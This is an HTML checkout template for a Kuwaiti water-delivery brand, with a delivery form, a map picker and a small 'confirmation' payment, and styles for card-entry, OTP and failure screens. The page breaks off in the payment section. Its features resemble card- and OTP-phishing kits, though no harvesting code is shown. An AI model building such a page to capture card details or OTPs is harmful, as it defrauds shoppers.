<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إتمام الطلب | OASIS KUWAIT</title>
    <meta name="csrf-token" content="{{ csrf_token() }}">
    
    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- Leaflet CSS -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Cairo', 'Inter', sans-serif; background-color: #f4f8fb; }
        
        header {
            background: linear-gradient(108deg, #052d42 0%, #025c85 50%, #0284c7 100%);
            position: fixed; top: 0; left: 0; width: 100%; z-index: 1000;
            padding: 16px 24px; display: flex; align-items: center; justify-content: space-between;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
        }
        .brand-logo-text { display: flex; align-items: baseline; gap: 6px; font-size: 1.15rem; font-weight: 800; letter-spacing: 0.08em; }
        .brand-logo-oasis, .brand-logo-oman { color: #ffffff; }
        .logo-circle-icon { width: 44px; height: 44px; background: #4c647a; border-radius: 35%; display: flex; align-items: center; justify-content: center; }
        
        footer { background: #0f172a; border-top: none; padding: 60px 0 20px; }
        .footer-container { max-width: 1240px; margin: 0 auto; display: grid; grid-template-columns: 1.5fr 1fr 1fr 1.2fr; gap: 40px; padding: 0 24px; }
        .footer-logo { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; text-decoration: none; }
        .footer-logo-icon { width: 36px; height: 36px; background: #008bc5; border-radius: 30%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
        .footer-col-title { font-weight: 800; color: #e2e8f0; margin-bottom: 16px; font-size: 1rem; }
        .footer-links-list { list-style: none; padding: 0; }
        .footer-link-item { margin-bottom: 10px; }
        .footer-link-item a { color: #94a3b8; text-decoration: none; font-weight: 600; font-size: 0.9rem; transition: color 0.2s; }
        .footer-link-item a:hover { color: #38bdf8; }
        .footer-contact-list { display: flex; flex-direction: column; gap: 12px; }
        .contact-item-row { display: flex; gap: 12px; color: #94a3b8; font-size: 0.88rem; font-weight: 600; align-items: flex-start; }
        .contact-item-row i { color: #38bdf8; margin-top: 2px; flex-shrink: 0; }
        .footer-brand-desc { font-size: 0.88rem; color: #64748b; line-height: 1.7; }
        .footer-socials { display: flex; gap: 10px; margin-top: 14px; }
        .footer-social-btn { width: 34px; height: 34px; background: #1e293b; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: #94a3b8; font-size: 0.95rem; text-decoration: none; transition: background 0.2s, color 0.2s; }
        .footer-social-btn:hover { background: #008bc5; color: #fff; }
        .footer-bottom-bar { text-align: center; padding-top: 32px; margin-top: 40px; border-top: 1px solid #1e293b; color: #64748b; font-size: 0.82rem; }
        @media (max-width: 768px) { .footer-container { grid-template-columns: 1fr 1fr; gap: 28px; } }
        @media (max-width: 480px) { .footer-container { grid-template-columns: 1fr; gap: 24px; } }

        /* Navbar styles for checkout */
        .co-navbar {
            background: linear-gradient(108deg, #052d42 0%, #025c85 50%, #0284c7 100%);
            position: fixed; top: 0; left: 0; width: 100%; z-index: 1000;
            padding: 0 24px; height: 64px;
            display: flex; align-items: center; justify-content: space-between;
            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
        }
        .co-navbar-logo { display: flex; align-items: center; gap: 12px; text-decoration: none; }
        .co-logo-circle { width: 40px; height: 40px; background: rgba(255,255,255,0.15); border-radius: 35%; display: flex; align-items: center; justify-content: center; border: 1px solid rgba(255,255,255,0.2); }
        .co-nav-links { display: flex; align-items: center; gap: 4px; }
        .co-nav-link { color: rgba(255,255,255,0.82); font-size: 0.88rem; font-weight: 700; text-decoration: none; padding: 7px 14px; border-radius: 8px; transition: all 0.2s; }
        .co-nav-link:hover { color: #fff; background: rgba(255,255,255,0.12); }
        .co-nav-link.active { color: #fff; background: rgba(255,255,255,0.18); }
        .co-navbar-right { display: flex; align-items: center; gap: 10px; }
        .co-back-btn { color: rgba(255,255,255,0.85); font-size: 0.88rem; font-weight: 700; text-decoration: none; padding: 8px 14px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.25); display: flex; align-items: center; gap: 7px; transition: all 0.2s; }
        .co-back-btn:hover { background: rgba(255,255,255,0.15); color: #fff; }
        @media (max-width: 768px) { .co-nav-links { display: none; } }

        /* Pages */
        .page { display: none; }
        .page.active { display: block; }

        /* Loading Overlay */
        .loading-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255,255,255,0.95); z-index: 9999;
            display: none; flex-direction: column; align-items: center; justify-content: center;
        }
        .loading-overlay.active { display: flex; }
        .loading-spinner {
            width: 48px; height: 48px; border: 4px solid #e2e8f0;
            border-top-color: #0284c7; border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .loading-text { margin-top: 16px; font-size: 1.1rem; font-weight: 700; color: #052d42; }
        .loading-subtext { margin-top: 6px; font-size: 0.85rem; color: #64748b; }

        /* Checkout Form Styles */
        .checkout-main { padding-top: 100px; padding-bottom: 60px; }
        .checkout-container { max-width: 640px; margin: 0 auto; padding: 0 16px; }
        .section-title { font-size: 1.75rem; font-weight: 900; color: #0f172a; text-align: center; margin-bottom: 8px; }
        .section-subtitle { color: #64748b; text-align: center; font-weight: 600; margin-bottom: 24px; }
        .free-delivery-banner {
            background: #ecfdf5; border: 1px solid #a7f3d0; border-radius: 16px;
            padding: 12px 16px; margin-bottom: 24px; display: flex; align-items: center; gap: 10px;
            color: #065f46; font-weight: 700; font-size: 0.9rem;
        }
        .form-card {
            background: #ffffff; border: 1px solid #f1f5f9; border-radius: 16px;
            padding: 24px; margin-bottom: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.04);
        }
        .form-card h3 { font-size: 1.1rem; font-weight: 800; color: #0f172a; margin-bottom: 16px; }
        .form-group { margin-bottom: 16px; }
        .form-label { display: block; font-size: 0.875rem; font-weight: 700; color: #334155; margin-bottom: 6px; }
        .form-input {
            width: 100%; padding: 12px 16px; border-radius: 12px; border: 1px solid #e2e8f0;
            background: #ffffff; font-size: 0.95rem; font-weight: 600; color: #0f172a;
            font-family: 'Cairo', sans-serif; outline: none; transition: border-color 0.2s, box-shadow 0.2s;
        }
        .form-input:focus { border-color: #0284c7; box-shadow: 0 0 0 3px rgba(2,132,199,0.1); }
        .form-input::placeholder { color: #94a3b8; font-weight: 400; }
        textarea.form-input { resize: vertical; }
        select.form-input { appearance: auto; cursor: pointer; }
        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }

        /* Map Location Selector */
        .map-toggle-btn {
            display: flex; align-items: center; justify-content: space-between; gap: 12px;
            width: 100%; padding: 16px 20px; border-radius: 14px; border: 1.5px solid #cbd5e1;
            background: #f0f9ff; color: #0284c7; font-size: 0.95rem; font-weight: 700;
            font-family: 'Cairo', sans-serif; cursor: pointer; transition: all 0.2s; margin-top: 12px;
            position: relative;
        }
        .map-toggle-btn:hover { border-color: #0284c7; background: #e0f2fe; box-shadow: 0 2px 8px rgba(2, 132, 199, 0.15); }
        .map-toggle-btn i { font-size: 1.2rem; }
        .map-toggle-btn-icon-circle {
            width: 48px; height: 48px; background: #0284c7; border-radius: 50%;
            display: flex; align-items: center; justify-content: center; color: #ffffff;
            font-size: 1.3rem; flex-shrink: 0;
        }

        /* Map Modal Styles */
        .map-modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.5); z-index: 9999; display: none;
            align-items: center; justify-content: center; padding: 16px;
        }
        .map-modal-overlay.active { display: flex; }
        .map-modal-content {
            background: #ffffff; border-radius: 20px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 600px; width: 100%; max-height: 90vh; overflow-y: auto;
            display: flex; flex-direction: column; animation: slideUp 0.3s ease;
        }
        @keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        .map-modal-header {
            display: flex; align-items: center; justify-content: space-between;
            padding: 20px 24px; border-bottom: 1px solid #e2e8f0; background: #f8fafc;
        }
        .map-modal-header h2 { font-size: 1.2rem; font-weight: 800; color: #0f172a; margin: 0; }
        .map-modal-close {
            background: none; border: none; font-size: 1.5rem; color: #64748b;
            cursor: pointer; padding: 4px; transition: color 0.2s;
        }
        .map-modal-close:hover { color: #0f172a; }
        .map-modal-info {
            padding: 16px 24px; background: #ecfdf5; border-bottom: 1px solid #a7f3d0;
            color: #065f46; font-size: 0.9rem; font-weight: 600;
        }
        .map-modal-map {
            width: 100%; height: 300px; background: #f1f5f9;
            border-radius: 0;
        }
        .map-modal-actions {
            display: grid; grid-template-columns: 1fr 1fr; gap: 12px;
            padding: 16px 24px;
        }
        .map-modal-action-btn {
            display: flex; align-items: center; justify-content: center; gap: 8px;
            padding: 12px; border-radius: 10px; border: 1.5px solid #e2e8f0;
            background: #ffffff; color: #475569; font-size: 0.85rem; font-weight: 700;
            font-family: 'Cairo', sans-serif; cursor: pointer; transition: all 0.2s;
        }
        .map-modal-action-btn:hover { border-color: #0284c7; color: #0284c7; }
        .map-modal-action-btn.locate-btn:hover { border-color: #059669; color: #059669; }
        .map-modal-coords {
            padding: 12px 24px; font-size: 0.85rem; color: #64748b;
            text-align: center; font-family: monospace; background: #f8fafc;
            border-bottom: 1px solid #e2e8f0;
        }
        .map-modal-confirm-btn {
            margin: 16px 24px; padding: 14px; border-radius: 12px; border: none;
            background: #0284c7; color: #ffffff; font-size: 0.95rem; font-weight: 800;
            font-family: 'Cairo', sans-serif; cursor: pointer; transition: all 0.2s;
            display: flex; align-items: center; justify-content: center; gap: 8px;
        }
        .map-modal-confirm-btn:hover:not(:disabled) { background: #0369a1; }
        .map-modal-confirm-btn:disabled { opacity: 0.5; cursor: not-allowed; }
        @media (max-width: 600px) {
            .map-modal-content { max-width: 100%; border-radius: 16px 16px 0 0; }
            .map-modal-map { height: 250px; }
            .map-modal-actions { grid-template-columns: 1fr; }
            .gateway-row { grid-template-columns: 1fr; }
            .form-row { grid-template-columns: 1fr; }
            .checkout-main { padding-top: 80px; padding-bottom: 40px; }
            .section-title { font-size: 1.4rem; }
            .form-card { padding: 16px; }
            .gateway-card { margin: 20px 12px; }
            .gateway-form { padding: 0 16px 16px; }
            .gateway-amount-bar { padding: 12px 16px; }
            .mock-card-preview { margin: 16px 16px; padding: 20px; }
            .btn-submit, .btn-pay { font-size: 1rem; padding: 14px; }
        }

        /* Legacy map styles (kept for compatibility) */
        .map-actions { display: flex; gap: 8px; margin-top: 8px; }
        .map-action-btn {
            flex: 1; padding: 10px; border-radius: 10px; border: 1.5px solid #e2e8f0;
            background: #ffffff; color: #475569; font-size: 0.82rem; font-weight: 700;
            font-family: 'Cairo', sans-serif; cursor: pointer; transition: all 0.2s;
            display: flex; align-items: center; justify-content: center; gap: 6px;
        }
        .map-action-btn:hover { border-color: #0284c7; color: #0284c7; }
        .map-action-btn.locate-btn { color: #059669; }
        .map-action-btn.locate-btn:hover { border-color: #059669; }

        .map-coords-display {
            font-size: 0.78rem; color: #64748b; margin-top: 6px; text-align: center;
            font-family: monospace; direction: ltr;
        }
        .map-selected-badge {
            display: none; font-size: 0.8rem; color: #059669; font-weight: 700;
            margin-top: 6px; text-align: center;
        }
        .map-selected-badge.show { display: block; }
        @media (max-width: 600px) { .form-row { grid-template-columns: 1fr; } }

        .error-msg { color: #ef4444; font-size: 0.8rem; font-weight: 600; margin-top: 4px; display: none; }
        .error-msg.show { display: block; }
        .form-input.error { border-color: #ef4444; }

        /* Payment method radio cards */
        .payment-option {
            display: block; border: 2px solid #e2e8f0; border-radius: 16px; padding: 16px;
            cursor: pointer; transition: all 0.2s; margin-bottom: 12px;
        }
        .payment-option:hover { border-color: #bae6fd; }
        .payment-option.selected { border-color: #0284c7; background: #f0f9ff; }
        .payment-option-inner { display: flex; align-items: flex-start; gap: 12px; }
        .payment-option-inner input { margin-top: 4px; }
        .payment-option-inner .opt-title { font-weight: 800; color: #0f172a; font-size: 0.95rem; }
        .payment-option-inner .opt-desc { color: #64748b; font-size: 0.85rem; margin-top: 4px; line-height: 1.5; }

        /* Submit Button */
        .btn-submit {
            width: 100%; padding: 16px; border-radius: 16px; border: none;
            background: #0284c7; color: #ffffff; font-size: 1.1rem; font-weight: 800;
            font-family: 'Cairo', sans-serif; cursor: pointer; transition: all 0.2s;
            box-shadow: 0 4px 12px rgba(2,132,199,0.3);
        }
        .btn-submit:hover { background: #0369a1; transform: translateY(-1px); }
        .btn-submit:active { transform: scale(0.98); }
        .btn-submit:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }

        /* Order Summary */
        .summary-item { display: flex; justify-content: space-between; padding: 8px 0; font-size: 0.9rem; }
        .summary-item-name { color: #475569; font-weight: 600; }
        .summary-item-price { color: #0284c7; font-weight: 800; }
        .summary-divider { border: none; border-top: 1px solid #e2e8f0; margin: 8px 0; }
        .summary-row { display: flex; justify-content: space-between; font-weight: 700; color: #475569; font-size: 0.9rem; }
        .summary-total { display: flex; justify-content: space-between; font-weight: 900; font-size: 1.1rem; color: #0f172a; padding-top: 12px; border-top: 1px solid #e2e8f0; }
        .summary-total-val { color: #0284c7; }

        /* ============ PAYMENT GATEWAY STYLES ============ */
        .payment-page-header {
            background: linear-gradient(135deg, #0f172a 0%, #1e3a5f 100%);
            padding: 94px 0 30px; text-align: center; color: #ffffff;
        }
        .payment-page-header h1 { font-size: 1.5rem; font-weight: 900; }
        .payment-page-header p { color: rgba(255,255,255,0.7); margin-top: 6px; font-size: 0.9rem; }
        
        .gateway-card {
            max-width: 500px; margin: 30px auto; background: #ffffff;
            border-radius: 16px; box-shadow: 0 10px 40px rgba(0,0,0,0.08);
            overflow: hidden; border: 1px solid #e2e8f0;
        }
        .gateway-header {
            background: linear-gradient(135deg, #1e3a5f 0%, #0f2744 100%);
            padding: 20px 24px; display: flex; align-items: center; gap: 12px;
        }
        .gateway-header-icon { width: 40px; height: 40px; background: rgba(255,255,255,0.15); border-radius: 10px; display: flex; align-items: center; justify-content: center; }
        .gateway-header-icon i { color: #ffffff; font-size: 1.2rem; }
        .gateway-header-text { color: #ffffff; }
        .gateway-header-text strong { font-size: 1rem; display: block; }
        .gateway-header-text span { font-size: 0.8rem; color: rgba(255,255,255,0.7); }
        
        .gateway-amount-bar {
            background: #f8fafc; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center;
            border-bottom: 1px solid #e2e8f0;
        }
        .gateway-amount-label { font-size: 0.85rem; color: #64748b; font-weight: 600; }
        .gateway-amount-value { font-size: 1.3rem; font-weight: 900; color: #052d42; }

        .mock-card-preview {
            background: linear-gradient(135deg, #1e3a5f 0%, #0f2744 50%, #1e3a5f 100%);
            margin: 20px 24px; border-radius: 14px; padding: 24px; color: #ffffff;
            position: relative; min-height: 160px;
            box-shadow: 0 8px 24px rgba(15,39,68,0.3);
        }
        .mock-card-brand { position: absolute; top: 16px; left: 20px; font-size: 2rem; }
        .mock-card-chip {
            width: 40px; height: 30px; background: linear-gradient(135deg, #d4a843 0%, #c4922e 100%);
            border-radius: 6px; margin-bottom: 20px;
        }
        .mock-card-number-display { 
            font-size: 1.3rem; font-weight: 700; letter-spacing: 3px; font-family: monospace; margin-bottom: 16px;
            direction: ltr !important; text-align: left !important; unicode-bidi: bidi-override !important;
        }
        .mock-card-meta { display: flex; justify-content: space-between; }
        .mock-card-meta-label { font-size: 0.65rem; color: rgba(255,255,255,0.6); text-transform: uppercase; }
        .mock-card-meta-value { 
            font-size: 0.9rem; font-weight: 700; 
            direction: ltr !important; display: inline-block;
        }

        .gateway-form { padding: 0 24px 24px; }
        .gateway-input-group { margin-bottom: 16px; }
        .gateway-label { display: block; font-size: 0.8rem; font-weight: 700; color: #475569; margin-bottom: 6px; }
        .gateway-input {
            width: 100%; padding: 12px 16px; border-radius: 10px; border: 1.5px solid #e2e8f0;
            font-size: 1rem; font-weight: 600; font-family: 'Cairo', monospace;
            outline: none; transition: all 0.2s; background: #ffffff;
        }
        .gateway-input[type="text"] { direction: auto; }
        #gw-card-number { direction: ltr !important; text-align: left !important; font-family: 'Courier New', monospace !important; }
        .gateway-input:focus { border-color: #0284c7; box-shadow: 0 0 0 3px rgba(2,132,199,0.1); }
        .gateway-input.error { border-color: #ef4444; }
        .gateway-input::placeholder { color: #94a3b8; }
        .gateway-input-wrap { position: relative; }
        .gateway-input-icon { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); font-size: 1.4rem; color: #94a3b8; z-index: 1; }

        /* Card number input LTR - Enhanced */
        #gw-card-number { 
            direction: ltr !important; 
            text-align: left !important; 
            unicode-bidi: bidi-override !important;
            font-family: 'Courier New', 'Courier', monospace !important;
            letter-spacing: 2px;
        }
        #gw-card-number::placeholder { 
            direction: ltr !important;
            text-align: left !important;
        }
        
        .gateway-row { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }

        .gateway-error { color: #ef4444; font-size: 0.78rem; font-weight: 600; margin-top: 4px; }
        .gateway-error:not(.hidden) { display: block; }
        .gateway-error.hidden { display: none; }

        .btn-pay {
            width: 100%; padding: 16px; border-radius: 12px; border: none;
            background: linear-gradient(135deg, #0284c7 0%, #0369a1 100%);
            color: #ffffff; font-size: 1.1rem; font-weight: 800;
            font-family: 'Cairo', sans-serif; cursor: pointer; transition: all 0.2s;
            margin-top: 8px;
        }
        .btn-pay:hover { background: linear-gradient(135deg, #0369a1 0%, #075985 100%); }
        .btn-pay:disabled { opacity: 0.7; cursor: not-allowed; }

        .btn-back {
            display: inline-flex; align-items: center; gap: 6px; padding: 12px 20px;
            background: none; border: 1.5px solid #e2e8f0; border-radius: 12px;
            color: #64748b; font-weight: 700; font-size: 0.9rem; cursor: pointer;
            font-family: 'Cairo', sans-serif; transition: all 0.2s;
        }
        .btn-back:hover { border-color: #94a3b8; color: #0f172a; }

        .gateway-footer {
            display: flex; align-items: center; justify-content: space-between;
            padding: 16px 24px; border-top: 1px solid #e2e8f0; font-size: 0.78rem; color: #94a3b8;
        }
        .security-badge { display: flex; align-items: center; gap: 4px; }
        .security-badge i { color: #10b981; }

        /* ============ OTP PAGE STYLES ============ */
        .otp-page { padding-top: 100px; padding-bottom: 60px; }
        .otp-container { max-width: 480px; margin: 0 auto; padding: 0 16px; }
        .otp-card {
            background: #ffffff; border-radius: 20px; padding: 36px 28px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.06); border: 1px solid #e2e8f0;
            text-align: center;
        }
        .otp-icon {
            width: 72px; height: 72px; border-radius: 50%; background: #e0f2fe;
            display: flex; align-items: center; justify-content: center;
            margin: 0 auto 20px; font-size: 2rem; color: #0284c7;
        }
        .otp-title { font-size: 1.3rem; font-weight: 800; color: #0f172a; margin-bottom: 8px; }
        .otp-subtitle { color: #64748b; font-size: 0.9rem; line-height: 1.6; margin-bottom: 28px; }
        
        .otp-input {
            width: 100%; padding: 14px; border-radius: 14px; border: 2px solid #e2e8f0;
            font-size: 2rem; letter-spacing: 14px; text-align: center; font-weight: 800;
            font-family: monospace; outline: none; transition: border-color 0.2s;
        }
        .otp-input:focus { border-color: #0284c7; }
        .otp-input.error { border-color: #ef4444; }

        .otp-resend { font-size: 0.85rem; color: #64748b; margin: 20px 0; }
        .otp-resend strong { color: #0284c7; }

        .btn-otp {
            width: 100%; padding: 16px; border-radius: 14px; border: none;
            background: #0284c7; color: #ffffff; font-size: 1.05rem; font-weight: 800;
            font-family: 'Cairo', sans-serif; cursor: pointer; transition: all 0.2s;
        }
        .btn-otp:hover { background: #0369a1; }
        .btn-otp:disabled { opacity: 0.7; cursor: not-allowed; }

        /* ============ FAILURE PAGE STYLES ============ */
        .failure-page { padding-top: 100px; padding-bottom: 60px; }
        .failure-container { max-width: 480px; margin: 0 auto; padding: 0 16px; }
        .failure-card {
            background: #ffffff; border-radius: 20px; overflow: hidden;
            box-shadow: 0 10px 40px rgba(0,0,0,0.08); border: 1px solid #e2e8f0;
            border-top: 6px solid #dc2626; padding: 36px 28px; text-align: center;
        }
        .failure-icon {
            width: 76px; height: 76px; border-radius: 50%; background: #fef2f2;
            border: 1px solid #fee2e2; display: flex; align-items: center; justify-content: center;
            margin: 0 auto 20px;
        }
        .failure-icon svg { width: 42px; height: 42px; }
        .failure-title { color: #dc2626; font-weight: 900; font-size: 1.4rem; margin-bottom: 14px; }
        .failure-desc { color: #475569; font-size: 0.95rem; line-height: 1.6; margin-bottom: 24px; }
        .btn-failure {
            width: 100%; padding: 16px; border-radius: 14px; border: none;
            background: #dc2626; color: #ffffff; font-size: 1.05rem; font-weight: 800;
            font-family: 'Cairo', sans-serif; cursor: pointer; transition: background 0.2s;
            display: flex; align-items: center; justify-content: center; gap: 8px;
        }
        .btn-failure:hover { background: #b91c1c; }
        .failure-note { color: #94a3b8; font-size: 0.85rem; margin-top: 16px; line-height: 1.5; }
        .failure-divider { border: none; border-top: 1px solid #f1f5f9; margin: 28px 0 16px; }
        .failure-badges { display: flex; align-items: center; justify-content: space-between; font-size: 0.8rem; flex-wrap: wrap; gap: 12px; }
        .pci-badge { border: 1px solid #cbd5e1; border-radius: 6px; padding: 4px 10px; color: #64748b; font-weight: 700; }
        .powered-text { color: #64748b; }
        .powered-text strong { color: #0284c7; }
        .secure-pay-text { color: #1e3a8a; font-weight: 800; }
    </style>
<style>
        /* ── PREVENT HORIZONTAL VIEWPORT OVERFLOW ON MOBILE ── */
        html, body {
            width: 100% !important;
            max-width: 100% !important;
            overflow-x: hidden !important;
            position: relative;
            box-sizing: border-box;
        }

        *, *::before, *::after {
            box-sizing: border-box;
        }

        #homepage-view,
        #about-page-view,
        #faq-page-view,
        #contact-page-view,
        #policy-page-view,
        #page-cart-view,
        #page-checkout-delivery-view,
        #page-checkout-location-view,
        #page-checkout-review-view,
        #page-checkout-payment-view,
        #page-checkout-success-view,
        #page-checkout-otp-view,
        #page-checkout-failure-view {
            width: 100% !important;
            max-width: 100% !important;
            overflow-x: hidden !important;
            box-sizing: border-box !important;
        }

        @media (max-width: 768px) {
            .policy-page-content-wrapper,
            .story-wrapper,
            .why-us-wrapper,
            .contact-wrapper,
            .delivery-wrapper,
            .reviews-wrapper,
            .hero-container,
            .checkout-shell,
            .footer-container {
                width: 100% !important;
                max-width: 100% !important;
                padding-left: 14px !important;
                padding-right: 14px !important;
                box-sizing: border-box !important;
                overflow-x: hidden !important;
            }

            .page-mission-vision-grid,
            .page-stats-row,
            .page-values-grid,
            .contact-main-grid,
            .delivery-main-grid,
            .products-grid-ref,
            .why-us-grid,
            .quality-grid,
            .reviews-grid {
                grid-template-columns: 1fr !important;
                width: 100% !important;
                box-sizing: border-box !important;
            }
        }
</style>
</head>
<body>

    <!-- NAVBAR -->
    <header class="co-navbar">
        <!-- Logo -->
        <a href="/" class="co-navbar-logo">
            <div class="co-logo-circle">
                <svg viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" style="width:22px;height:22px;">
                    <path d="M15.5 21a5.5 5.5 0 0 0 5.5-5.5c0-2-1.5-3.5-3-5.5-.5-.7-1-1.5-1.5-2.5-.5 1-1 1.8-1.5 2.5-1.5 2-3 3.5-3 5.5A5.5 5.5 0 0 0 15.5 21z"></path>
                    <path d="M8.5 18a4.5 4.5 0 0 0 4.5-4.5c0-1.5-1-3-2.5-5C10 7.5 9.5 6.5 9 5.5 8.5 6.5 8 7.5 7.5 8.5 6 10.5 5 12 5 13.5A4.5 4.5 0 0 0 9.5 18z"></path>
                </svg>
            </div>
            <span class="brand-logo-text"><span class="brand-logo-oasis">مياه الواحة</span> <span class="brand-logo-oman">الكويت</span></span>
        </a>

        <!-- Center Nav Links -->
        <nav class="co-nav-links">
            <a href="/" class="co-nav-link">Home</a>
            <a href="/#about" class="co-nav-link">About</a>
            <a href="/#contact" class="co-nav-link">Contact</a>
            <a href="/#faq" class="co-nav-link">FAQ</a>
            <a href="/checkout" class="co-nav-link active">Checkout</a>
        </nav>

        <!-- Right: Back to shop + cart badge -->
        <div class="co-navbar-right">
            <a href="/" class="co-back-btn">
                <i class="fa-solid fa-arrow-right"></i>
                <span>المتجر</span>
            </a>
        </div>
    </header>

    <!-- ============ PAGE 1: DELIVERY DETAILS ============ -->
    <div id="page-delivery" class="page active">
        <div class="checkout-main">
            <div class="checkout-container">
                <h1 class="section-title">معلومات التوصيل</h1>
                <p class="section-subtitle">املأ بياناتك وسنوصل طلبك إلى باب منزلك.</p>

                <div class="free-delivery-banner">
                    <span style="font-size: 1.2rem;">🚚</span>
                    <span>توصيل مجاني لجميع محافظات ومدن دولة الكويت</span>
                </div>

                <form id="delivery-form" onsubmit="return false;">
                    <!-- Personal Info & Country -->
                    <div class="form-card">
                        <h3>المعلومات الشخصية والدولة</h3>
                        <div class="form-group">
                            <label class="form-label">اختر الدولة</label>
                            <select class="form-input" id="d-country" onchange="onCountryChange(this.value)">
                            </select>
                        </div>
                        <div class="form-group">
                            <label class="form-label">الاسم الكامل</label>
                            <input class="form-input" type="text" id="d-name" placeholder="أدخل اسمك الكامل" required>
                            <div class="error-msg" id="err-name">يرجى إدخال الاسم الكامل</div>
                        </div>
                        <div class="form-group">
                            <label class="form-label">رقم الجوال</label>
                            <div dir="ltr" style="display: flex; align-items: stretch; border-radius: 12px; border: 1px solid #e2e8f0; overflow: hidden;">
                                <span id="d-phone-code" style="padding: 12px 16px; background: #f8fafc; border-right: 1px solid #e2e8f0; color: #0284c7; font-weight: 700; font-size: 0.95rem; white-space: nowrap;">+965</span>
                                <input class="form-input" style="border: none; border-radius: 0; flex: 1;" type="tel" id="d-phone" inputmode="numeric" maxlength="15" placeholder="XXXXXXXX" required>
                            </div>
                            <div class="error-msg" id="err-phone">يرجى إدخال رقم هاتف صحيح</div>
                        </div>
                    </div>

                    <!-- Delivery Address -->
                    <div class="form-card">
                        <h3>عنوان التوصيل</h3>
                        <div class="form-row">
                            <div class="form-group">
                                <label class="form-label" id="d-gov-label">المافظة / المنطقة</label>
                                <select class="form-input" id="d-governorate" required>
                                    <option value="">اختر المحافظة / المنطقة</option>
                                </select>
                            </div>
                            <div class="form-group">
                                <label class="form-label" id="d-wil-label">المنطقة / المدينة</label>
                                <select class="form-input" id="d-wilaya" required>
                                    <option value="">اختر المنطقة / المدينة</option>
                                </select>
                            </div>
                        </div>
                        <div class="form-group">
                            <label class="form-label">العنوان التفصيلي</label>
                            <textarea class="form-input" id="d-address" rows="2" placeholder="الشارع، رقم المنزل، علامة مميزة..." required></textarea>
                            <div class="error-msg" id="err-address">يرجى إدخال العنوان التفصيلي</div>
                        </div>

                        <!-- Map Location Selector Button -->
                        <button type="button" class="map-toggle-btn" id="btn-toggle-map" onclick="openMapModal()">
                            <div style="display: flex; align-items: center; gap: 12px; flex: 1;">
                                <i class="fa-solid fa-arrow-right" style="color: #cbd5e1; font-size: 1rem;"></i>
                                <span>حدد الموقع من الخريطة</span>
                            </div>
                            <div class="map-toggle-btn-icon-circle">
                                <i class="fa-solid fa-location-dot"></i>
                            </div>
                        </button>

                        <!-- Map Modal Overlay -->
                        <div class="map-modal-overlay" id="map-modal-overlay" onclick="closeMapModal(event)">
                            <div class="map-modal-content" onclick="event.stopPropagation()">
                                <!-- Modal Header -->
                                <div class="map-modal-header">
                                    <h2>اختر موقعك من الخريطة</h2>
                                    <button type="button" class="map-modal-close" onclick="closeMapModal()">
                                        <i class="fa-solid fa-xmark"></i>
                                    </button>
                                </div>

                                <!-- Modal Info -->
                                <div class="map-modal-info">
                                    <p>اضغط على الخريطة أو استخدم الموقع الحالي لتحديث موقعك</p>
                                </div>

                                <!-- Map Container -->
                                <div id="checkout-map" class="map-modal-map"></div>

                                <!-- Modal Actions -->
                                <div class="map-modal-actions">
                                    <button type="button" class="map-modal-action-btn locate-btn" onclick="detectCheckoutLocation()">
                                        <i class="fa-solid fa-crosshairs"></i>
                                        <span>استخدم موقعي الحالي (GPS)</span>
                                    </button>
                                    <button type="button" class="map-modal-action-btn remove-btn" onclick="removeCheckoutMarker()">
                                        <i class="fa-solid fa-xmark"></i>
                                        <span>إزالة الموقع الحالي</span>
                                    </button>
                                </div>

                                <!-- Coordinates Display -->
                                <div class="map-modal-coords" id="map-coords-display">لم يتم تحديث موقع بعد</div>

                                <!-- Confirm Button -->
                                <button type="button" class="map-modal-confirm-btn" id="map-confirm-btn" onclick="confirmMapLocation()" disabled>
                                    <i class="fa-solid fa-circle-check"></i>
                                    <span>تأكيد هذا الموقع</span>
                                </button>
                            </div>
                        </div>
                    </div>

                    <!-- Order Notes -->
                    <div class="form-card">
                        <h3>ملاحظات الطلب (اختياري)</h3>
                        <textarea class="form-input" id="d-notes" rows="2" placeholder="أي تعليمات خاصة للتوصيل..."></textarea>
                    </div>

                    <!-- Payment Method -->
                    <div class="form-card">
                        <h3>طريقة الدفع</h3>
                        <label class="payment-option selected" id="pay-opt-partial">
                            <div class="payment-option-inner">
                                <input type="radio" name="payment" value="partial" checked>
                                <div>
                                    <div class="opt-title">دفع 1.000 د.ك لتأكيد الطلب</div>
                                    <div class="opt-desc">ادفع مبلغ التأكيد الآن، والمبلغ المتبقي عند التسليم</div>
                                </div>
                            </div>
                        </label>
                        <label class="payment-option" id="pay-opt-full">
                            <div class="payment-option-inner">
                                <input type="radio" name="payment" value="full">
                                <div>
